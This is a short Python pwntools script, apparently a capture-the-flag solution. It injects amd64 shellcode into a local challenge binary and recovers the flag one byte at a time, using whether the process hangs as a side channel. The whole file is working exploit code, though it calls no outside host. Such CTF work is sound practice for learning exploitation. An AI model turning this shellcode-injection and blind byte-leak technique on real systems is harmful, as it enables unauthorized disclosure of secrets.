from pwn import *
from time import sleep
import string

context.arch = 'amd64'

io = process(['./sc5'])
# io = gdb.debug(['./sc5'], "b *0x400a5a")

flag_addr = 0x6010c0
bss_buf = 0x6010a0

sc_tmp = asm("""
    mov rax, 0x1234567812345678
    mov bl, byte ptr [rax]
    mov rax, 0x6010bf
    mov cl, byte ptr [rax]
    cmp bl, cl
    je infloop
    ret
infloop:
    jmp infloop
""")

# io.sendlineafter("code", sc+"x")


context.log_level = 'info'
flag = "flag{t"
for  i in range(len(flag), 0x40):
    for ch in "flag{}test":
        print(i, ch)
        io = process("./sc5")
        sc = (sc_tmp.replace(p64(0x1234567812345678), p64(flag_addr+i))).ljust(0x1f)
        io.sendlineafter("code", sc+(ch))
        sleep(0.3)
        if io.connected() :
            flag += (ch)
            print(flag)
            io.close()
            break
        io.close()
sleep(0.5)

# io.interactive()
